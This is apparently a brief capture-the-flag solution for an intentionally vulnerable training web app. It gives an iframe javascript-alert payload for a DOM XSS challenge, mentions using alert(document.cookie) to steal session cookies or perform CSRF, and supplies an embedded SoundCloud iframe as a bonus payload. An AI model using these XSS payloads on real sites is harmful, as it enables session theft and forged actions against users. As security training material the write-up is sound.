## DOM XSS
### Challenge: Perform a DOM XSS attack with \<iframe src=\"javascript:alert\(\`xss\`\)\"\>.

Enter ``<iframe src="javascript:alert(`xss`)">`` at search box.

_Note: There are many ways to weaponize XSS attack. One common example would be to use `alert(document.cookie)` to steal client's session cookie or perform CSRF attack (using victim to execute malicious code/commands on your behalf)_ 

### Challenge: Bonus Payload
Just use the provided payload 
```
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
```